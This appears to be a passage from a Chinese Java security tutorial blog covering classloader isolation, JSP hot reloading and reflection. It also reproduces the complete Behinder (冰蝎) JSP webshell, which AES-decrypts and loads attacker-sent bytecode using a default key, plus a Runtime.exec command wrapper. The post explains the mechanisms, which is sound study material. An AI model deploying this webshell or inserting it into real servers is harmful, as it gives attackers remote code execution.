<span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取命令执行结果</span></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(baos);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>远程jar包中的CMD类：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CMD</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230703145512054.png" alt="image-20230703145512054" style="zoom:80%;" />

<h3 id="类加载隔离"><a href="#类加载隔离" class="headerlink" title="类加载隔离"></a>类加载隔离</h3><p>创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两者必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。</p>
<img src="/image/202110251829223.png" alt="img" style="zoom: 50%;" />

<h3 id="跨类加载器加载"><a href="#跨类加载器加载" class="headerlink" title="跨类加载器加载"></a>跨类加载器加载</h3><p>RASP和IAST经常会用到跨类加载器加载类的情况，因为RASP&#x2F;IAST会在任意可能存在安全风险的类中插入检测代码，因此必须得保证RASP&#x2F;IAST的类能够被插入的类所使用的类加载正确加载，否则就会出现ClassNotFoundException，除此之外，跨类加载器调用类方法时需要特别注意一个基本原则：</p>
<p><strong>ClassLoader A和ClassLoader B可以加载相同类名的类，但是ClassLoader A中的Class A和ClassLoader B中的Class A是完全不同的对象，两者之间调用只能通过反射。</strong></p>
<p><strong>跨类加载器实例：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.y5neko.sec.classloader.TestClassLoader.TEST_CLASS_BYTES;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.y5neko.sec.classloader.TestClassLoader.TEST_CLASS_NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCrossClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderA</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ClassLoaderA</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 加载类字节码</span></span><br><span class="line">            defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, <span class="number">0</span>, TEST_CLASS_BYTES.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderB</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ClassLoaderB</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 加载类字节码</span></span><br><span class="line">            defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, <span class="number">0</span>, TEST_CLASS_BYTES.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 父类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parentClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// A类加载器</span></span><br><span class="line">        <span class="type">ClassLoaderA</span> <span class="variable">aClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoaderA</span>(parentClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// B类加载器</span></span><br><span class="line">        <span class="type">ClassLoaderB</span> <span class="variable">bClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoaderB</span>(parentClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用A/B类加载器加载同一个类</span></span><br><span class="line">        Class&lt;?&gt; aClass  = Class.forName(TEST_CLASS_NAME, <span class="literal">true</span>, aClassLoader);</span><br><span class="line">        Class&lt;?&gt; aaClass = Class.forName(TEST_CLASS_NAME, <span class="literal">true</span>, aClassLoader);</span><br><span class="line">        Class&lt;?&gt; bClass  = Class.forName(TEST_CLASS_NAME, <span class="literal">true</span>, bClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 比较A类加载器和B类加载器加载的类是否相等</span></span><br><span class="line">        System.out.println(<span class="string">&quot;aClass == aaClass：&quot;</span> + (aClass == aaClass));</span><br><span class="line">        System.out.println(<span class="string">&quot;aClass == bClass：&quot;</span> + (aClass == bClass));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n&quot;</span> + aClass.getName() + <span class="string">&quot;方法清单：&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取该类所有方法</span></span><br><span class="line">        Method[] methods = aClass.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建类实例</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">instanceA</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取hello方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">helloMethod</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用hello方法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String) helloMethod.invoke(instanceA);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n反射调用：&quot;</span> + TEST_CLASS_NAME + <span class="string">&quot;类&quot;</span> + helloMethod.getName() + <span class="string">&quot;方法，返回结果：&quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行输出结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//A类加载器和B类加载器加载的类不同</span></span><br><span class="line">aClass == aaClass：<span class="literal">true</span></span><br><span class="line">aClass == bClass：<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">com.y5neko.sec.classloader.TestHelloWorld方法清单：</span><br><span class="line"><span class="keyword">public</span> java.lang.String com.y5neko.sec.classloader.TestHelloWorld.hello()</span><br><span class="line"></span><br><span class="line">反射调用：com.y5neko.sec.classloader.TestHelloWorld类hello方法，返回结果：Hello World~</span><br></pre></td></tr></table></figure>

<h3 id="JSP自定义类加载后门"><a href="#JSP自定义类加载后门" class="headerlink" title="JSP自定义类加载后门"></a>JSP自定义类加载后门</h3><p>以<code>冰蝎</code>为首的JSP后门利用的就是自定义类加载实现的，冰蝎的客户端会将待执行的命令或代码片段通过动态编译成类字节码并加密后传到冰蝎的JSP后门，后门会经过AES解密得到一个随机类名的类字节码，然后调用自定义的类加载器加载，最终通过该类重写的<code>equals</code>方法实现恶意攻击，其中<code>equals</code>方法传入的<code>pageContext</code>对象是为了便于获取到请求和响应对象，需要注意的是冰蝎的命令执行等参数不会从请求中获取，而是直接插入到了类成员变量中。</p>
<p><strong>冰蝎JSP后门：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">k</span> <span class="operator">=</span> <span class="string">&quot;e45e329feb5d925b&quot;</span>;<span class="comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span></span><br><span class="line">        session.putValue(<span class="string">&quot;u&quot;</span>, k);</span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        c.init(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(k.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><strong>冰蝎命令执行类反编译：</strong></p>
<img src="/image/image-20230704154928197.png" alt="image-20230704154928197" style="zoom:80%;" />

<h3 id="JSP类加载"><a href="#JSP类加载" class="headerlink" title="JSP类加载"></a>JSP类加载</h3><p>JSP是JavaEE中的一种常用的脚本文件，可以在JSP中调用Java代码，实际上经过编译后的jsp就是一个Servlet文件，JSP和PHP一样可以实时修改。</p>
<p>众所周知，Java的类是不允许动态修改的（这里特指新增类方法或成员变量），之所以JSP具备热更新的能力，实际上借助的就是自定义类加载行为，当Servlet容器发现JSP文件发生了修改后就会创建一个新的类加载器来替代原类加载器，而被替代后的类加载器所加载的文件并不会立即释放，而是需要等待GC。</p>
<p><strong>模拟jsp文件动态加载程序</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestJSPClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 缓存JSP文件和类加载，刚jsp文件修改后直接替换类加载器实现JSP类字节码热加载</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;File, JSPClassLoader&gt; jspClassLoaderMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;File, JSPClassLoader&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建用于测试的test.jsp类字节码，类代码如下：</span></span><br><span class="line"><span class="comment">     * &lt;pre&gt;</span></span><br><span class="line"><span class="comment">     * package com.y5neko.sec.classloader;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * public class test_jsp &#123;</span></span><br><span class="line"><span class="comment">     *     public void _jspService() &#123;</span></span><br><span class="line"><span class="comment">     *         System.out.println(&quot;Hello...&quot;);</span></span><br><span class="line"><span class="comment">     *     &#125;</span></span><br><span class="line"><span class="comment">     * &#125;</span></span><br><span class="line"><span class="comment">     * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className 类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> content   用于测试的输出内容，如：Hello...</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> test_java类字节码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception 创建异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] createTestJSPClass(String className, String content) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 使用Javassist创建类字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个类，如：com.y5neko.sec.classloader.test_jsp</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctServletClass</span> <span class="operator">=</span> classPool.makeClass(className);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建_jspService方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType, <span class="string">&quot;_jspService&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctServletClass);</span><br><span class="line">        ctMethod.setModifiers(Modifier.PUBLIC);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入hello方法代码</span></span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;System.out.println(\&quot;&quot;</span> + content + <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将hello方法添加到类中</span></span><br><span class="line">        ctServletClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成类字节码</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = ctServletClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 释放资源</span></span><br><span class="line">        ctServletClass.detach();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 检测jsp文件是否改变，如果发生了修改就重新编译jsp并更新该jsp类字节码</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jspFile   JSP文件对象，因为是模拟的jsp文件所以这个文件不需要存在</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className 类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bytes     类字节码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> parent    JSP的父类加载</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> JSPClassLoader <span class="title function_">getJSPFileClassLoader</span><span class="params">(File jspFile, String className, <span class="type">byte</span>[] bytes, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="type">JSPClassLoader</span> <span class="variable">jspClassLoader</span> <span class="operator">=</span> <span class="built_in">this</span>.jspClassLoaderMap.get(jspFile);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟第一次访问test.jsp时jspClassLoader是空的，因此需要创建</span></span><br><span class="line">        <span class="keyword">if</span> (jspClassLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">            jspClassLoader = <span class="keyword">new</span> <span class="title class_">JSPClassLoader</span>(parent);</span><br><span class="line">            jspClassLoader.createClass(className, bytes);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 缓存JSP文件和所使用的类加载器</span></span><br><span class="line">            <span class="built_in">this</span>.jspClassLoaderMap.put(jspFile, jspClassLoader);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> jspClassLoader;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟第二次访问test.jsp，这个时候内容发生了修改，这里实际上应该检测文件的最后修改时间是否相当，</span></span><br><span class="line">        <span class="comment">// 而不是检测是否是0，因为当jspFile不存在的时候返回值是0，所以这里假设0表示这个文件被修改了，</span></span><br><span class="line">        <span class="comment">// 那么需要热加载该类字节码到类加载器。</span></span><br><span class="line">        <span class="keyword">if</span> (jspFile.lastModified() == <span class="number">0</span>) &#123;</span><br><span class="line">            jspClassLoader = <span class="keyword">new</span> <span class="title class_">JSPClassLoader</span>(parent);</span><br><span class="line">            jspClassLoader.createClass(className, bytes);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 缓存JSP文件和所使用的类加载器</span></span><br><span class="line">            <span class="built_in">this</span>.jspClassLoaderMap.put(jspFile, jspClassLoader);</span><br><span class="line">            <span class="keyword">return</span> jspClassLoader;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用动态的类加载器调用test_jsp#_jspService方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jspFile   JSP文件对象，因为是模拟的jsp文件所以这个文件不需要存在</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className 类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bytes     类字节码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> parent    JSP的父类加载</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invokeJSPServiceMethod</span><span class="params">(File jspFile, String className, <span class="type">byte</span>[] bytes, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="type">JSPClassLoader</span> <span class="variable">jspClassLoader</span> <span class="operator">=</span> getJSPFileClassLoader(jspFile, className, bytes, parent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 加载com.y5neko.sec.classloader.test_jsp类</span></span><br><span class="line">            Class&lt;?&gt; jspClass = jspClassLoader.loadClass(className);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建test_jsp类实例</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">jspInstance</span> <span class="operator">=</span> jspClass.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取test_jsp#_jspService方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">jspServiceMethod</span> <span class="operator">=</span> jspClass.getMethod(<span class="string">&quot;_jspService&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用_jspService方法</span></span><br><span class="line">            jspServiceMethod.invoke(jspInstance);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TestJSPClassLoader</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestJSPClassLoader</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span>      <span class="variable">className</span>   <span class="operator">=</span> <span class="string">&quot;com.y5neko.sec.classloader.test_jsp&quot;</span>;</span><br><span class="line">        <span class="type">File</span>        <span class="variable">jspFile</span>     <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/data/test.jsp&quot;</span>);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟第一次访问test.jsp文件自动生成test_jsp.java</span></span><br><span class="line">        <span class="type">byte</span>[] testJSPClass01 = createTestJSPClass(className, <span class="string">&quot;Hello y5neko!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        test.invokeJSPServiceMethod(jspFile, className, testJSPClass01, classLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟修改了test.jsp文件，热加载修改后的test_jsp.class</span></span><br><span class="line">        <span class="type">byte</span>[] testJSPClass02 = createTestJSPClass(className, <span class="string">&quot;Hello Y5neKO!&quot;</span>);</span><br><span class="line">        test.invokeJSPServiceMethod(jspFile, className, testJSPClass02, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * JSP类加载器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">JSPClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">JSPClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 创建类</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> className 类名</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> bytes     类字节码</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createClass</span><span class="params">(String className, <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">            defineClass(className, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该示例程序通过Javassist动态生成了两个不同的<code>com.y5neko.sec.classloader.test_jsp</code>类字节码，模拟JSP文件修改后的类加载，核心原理就是<strong>检测到JSP文件修改后动态替换类加载器</strong>，从而实现JSP热加载，具体的处理逻辑如下（第3和第4部未实现，使用了Javassist动态创建）：</p>
<ol>
<li>模拟客户端第一次访问test.jsp；</li>
<li>检测是否已缓存了test.jsp的类加载；</li>
<li><del>Servlet容器找到test.jsp文件并编译成test_jsp.java</del>；</li>
<li><del>编译成test_jsp.class文件</del>；</li>
<li>创建test.jsp文件专用的类加载器<code>jspClassLoader</code>，并缓存到<code>jspClassLoaderMap</code>对象中；</li>
<li><code>jspClassLoader</code>加载test_jsp.class字节码并创建<code>com.y5neko.sec.classloader.test_jsp</code>类；</li>
<li><code>jspClassLoader</code>调用<code>com.y5neko.sec.classloader.test_jsp</code>类的<code>_jspService</code>方法；</li>
<li>输出<code>Hello y5neko!</code>；</li>
<li>模拟客户端第二次访问test.jsp；</li>
<li>假设test.jsp文件发生了修改，重新编译test.jsp并创建一个新的类加载器<code>jspClassLoader</code>加载新的类字节码；</li>
<li>使用新创建的<code>jspClassLoader</code>类加载器调用<code>com.y5neko.sec.classloader.test_jsp</code>类的<code>_jspService</code>方法；</li>
<li>输出<code>Hello Y5neKO</code>；</li>
</ol>
<h2 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h2><p>Java反射(<code>Reflection</code>)是Java非常重要的动态特性，通过使用反射我们不仅可以获取到任何类的成员方法(<code>Methods</code>)、成员变量(<code>Fields</code>)、构造方法(<code>Constructors</code>)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。Java反射机制是Java语言的动态性的重要体现，也是Java的各种框架底层实现的灵魂。</p>
<blockquote>
<p>Java 的<strong>反射机制</strong>是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法； 并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。</p>
<p>而我们之前在上面介绍的运用new关键字去实例化类的过程就叫做<strong>正射</strong>。那么假如，我是说如果我们一开始并不知道我们要初始化的类对象是什么，那么阁下该如何应对呢?</p>
<p>所以总的来说，就是当我在程序运行前并不知道我们要实例什么类的时候，我们就需要运用反射，通过反射我们可以获取这个类的原型，然后为所欲为。</p>
</blockquote>
<h3 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h3><p>Java反射操作的是<code>java.lang.Class</code>对象，所以我们需要先想办法获取到Class对象，通常我们有如下几种方式获取一个类的Class对象：</p>
<ol>
<li><code>类名.class</code>，如:<code>com.y5neko.sec.classloader.TestHelloWorld.class</code>。</li>
<li><code>Class.forName(&quot;com.y5neko.sec.classloader.TestHelloWorld&quot;)</code>。</li>
<li><code>classLoader.loadClass(&quot;com.y5neko.sec.classloader.TestHelloWorld&quot;);</code></li>
</ol>
<h4 id="获取Runtime类Class对象代码片段"><a href="#获取Runtime类Class对象代码片段" class="headerlink" title="获取Runtime类Class对象代码片段"></a><strong>获取Runtime类Class对象代码片段</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">className</span>     <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime&quot;</span>;</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass1</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass2</span> <span class="operator">=</span> java.lang.Runtime.class;</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass3</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().loadClass(className);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.使用class.forName()方法</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>); <span class="comment">//里面要填:类所在的包名+类名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.使用实例化对象的getClass()方法</span></span><br><span class="line">phone p=<span class="keyword">new</span> <span class="title class_">phone</span>(); <span class="comment">//实例化对象</span></span><br><span class="line">Class p1=p.getClass();<span class="comment">//通过实例化对象来获取完整类的原型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.使用类的class方法</span></span><br><span class="line">Class p=phone.class;</span><br></pre></td></tr></table></figure>

<h3 id="获取实例化对象-object"><a href="#获取实例化对象-object" class="headerlink" title="获取实例化对象(object)"></a><strong>获取实例化对象(object)</strong></h3><p>获取实例化对象object的方法通常有两种:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.通过class的newInstance()方法</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">p1</span> <span class="operator">=</span> p.newInstance();</span><br><span class="line"><span class="comment">//这里也有另一种写法,区别是要进行强制类型转化</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line"><span class="type">phone</span> <span class="variable">p1</span> <span class="operator">=</span> (phone)p.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.通过constructor的newInstance()方法</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Constructor constructor=p.getConstructor();</span><br><span class="line">Object p1=constructor.newInstance();<span class="comment">//这里同上一样有另一种写法，就不再赘述</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//运用这种方法前需要先调用它的无参构造器，然后再实例化</span></span><br></pre></td></tr></table></figure>



<p>下面用一个实例来演示一下反射获取类和对象</p>
